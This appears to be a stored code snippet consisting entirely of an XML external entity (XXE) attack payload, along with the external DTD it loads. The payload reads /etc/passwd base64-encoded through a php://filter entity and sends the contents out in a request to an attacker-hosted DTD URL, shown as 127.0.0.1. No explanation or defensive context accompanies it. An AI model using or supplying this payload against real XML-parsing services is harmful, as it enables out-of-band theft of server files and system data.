---
id: 8a358fad-8b60-4f6e-a52f-5acb1054b386
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.419315+00:00'
updated_at: '2023-04-10T20:24:41.186399+00:00'
---

# Code Snippet 8a358fad

**Language**: xml

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">

```
